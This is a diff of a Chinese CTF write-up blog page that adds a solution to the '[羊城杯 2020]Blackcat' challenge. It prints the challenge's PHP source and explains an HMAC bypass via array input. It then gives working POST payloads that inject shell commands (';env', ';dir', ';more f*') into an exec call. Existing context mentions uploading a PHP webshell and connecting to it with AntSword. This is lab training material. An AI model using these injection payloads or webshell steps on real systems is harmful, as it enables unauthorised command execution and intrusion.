@@ -248,8 +248,15 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210213346158.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210213352137.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210213356592.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210225957003.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210230051803.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210230133626.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210231809066.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210232406306.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210232515942.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/18/NSSCTF/image-20260210233253434.png">
 <meta property="article:published_time" content="2026-01-17T16:34:05.000Z">
-<meta property="article:modified_time" content="2026-02-10T13:33:58.204Z">
+<meta property="article:modified_time" content="2026-02-10T15:33:03.863Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="NSSCTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -587,7 +594,7 @@
         
         
         
-          173 分钟
+          177 分钟
         
       </span>
     
@@ -642,7 +649,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-02-10T21:33:58+08:00
+                    本文最后更新于 2026-02-10T23:33:03+08:00
                   
                   
 
@@ -1120,7 +1127,7 @@
 <p><img src="/2026/01/18/NSSCTF/image-20260118120632958.png" srcset="/img/loading.gif" lazyload alt="image-20260118120632958"></p>
 <p>根据文件夹中的已有头像得知上传的路径</p>
 <p>payload</p>
-<p>&#x2F;images&#x2F;<a href="mailto:&#49;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#49;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a>&#x2F;1.php</p>
+<p>&#x2F;images&#x2F;<a href="mailto:&#49;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#49;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a>&#x2F;1.php</p>
 <p>访问成功后蚁剑连接</p>
 <p><img src="/2026/01/18/NSSCTF/image-20260118120639762.png" srcset="/img/loading.gif" lazyload alt="image-20260118120639762"></p>
 <p>ISCTF{48d85a4c-2174-41cb-9213-76b5b8fceeea}</p>
@@ -1847,6 +1854,43 @@
 
 <h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><p>SSTI貌似有很多waf，利用焚靖绕过</p>
 <p><img src="/2026/01/18/NSSCTF/image-20260210213356592.png" srcset="/img/loading.gif" lazyload alt="image-20260210213356592"></p>
+<h1 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h1><p><img src="/2026/01/18/NSSCTF/image-20260210225957003.png" srcset="/img/loading.gif" lazyload alt="image-20260210225957003"></p>
+<p>有一个音频但是点不开，先看看源码</p>
+<p><img src="/2026/01/18/NSSCTF/image-20260210230051803.png" srcset="/img/loading.gif" lazyload alt="image-20260210230051803"></p>
+<p>看到了这个音频文件点点看</p>
+<p><img src="/2026/01/18/NSSCTF/image-20260210230133626.png" srcset="/img/loading.gif" lazyload alt="image-20260210230133626"></p>
+<p>上面全是乱码但在最下面居然有源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>    <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个hash_hmac()函数</p>
+<p>hash_hmac($algo, $data, $key)</p>
+<p>当传入的 $data为数组时，加密得到的固定结果就是null</p>
+<p>所以给White-cat-monitor赋值为一个数组</p>
+<p>这样$clandestine &#x3D; hash_hmac(‘sha256’, $_POST[‘White-cat-monitor’], $clandestine);的值就为null</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<p>执行这个拼接的命令但想到nc是用来连接的，由于exec只返回命令执行结果的最后一行内容，为了不干扰后续的命令执行先给One-ear赋值分号再加上后续的命令</p>
+<p>需要让Black-Cat-Sheriff的值等于$hh &#x3D; hash_hmac(‘sha256’, $_POST[‘One-ear’], $clandestine);就要运行一下看看$hh的结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-string">&#x27;;env&#x27;</span>, <span class="hljs-literal">null</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">White-<span class="hljs-keyword">cat</span>-monitor[]=1&amp;<span class="hljs-keyword">One</span>-ear=;env&amp;Black-<span class="hljs-keyword">Cat</span>-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/18/NSSCTF/image-20260210231809066.png" srcset="/img/loading.gif" lazyload alt="image-20260210231809066"></p>
+<p>发现flag不在环境变量里，之前试了ls都没有找到</p>
+<p><img src="/2026/01/18/NSSCTF/image-20260210232406306.png" srcset="/img/loading.gif" lazyload alt="image-20260210232406306"></p>
+<p>看了眼信息发现一直忽略了是在Windows环境下</p>
+<p>那查看目录下文件的命令就是dir</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-string">&#x27;;dir&#x27;</span>, <span class="hljs-literal">null</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">White-<span class="hljs-keyword">cat</span>-monitor[]=1&amp;<span class="hljs-keyword">One</span>-ear=;<span class="hljs-keyword">dir</span>&amp;Black-<span class="hljs-keyword">Cat</span>-Sheriff=83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/18/NSSCTF/image-20260210232515942.png" srcset="/img/loading.gif" lazyload alt="image-20260210232515942"></p>
+<p>payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">White-cat-monitor[]=1&amp;<span class="hljs-attribute">One-ear</span>=;more f*&amp;<span class="hljs-attribute">Black-Cat-Sheriff</span>=1f61c14baad48fa2946c106e7224a54311ed4936ad229e3763ccceffe59b1a76<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/18/NSSCTF/image-20260210233253434.png" srcset="/img/loading.gif" lazyload alt="image-20260210233253434"></p>
 
                 
               </div>
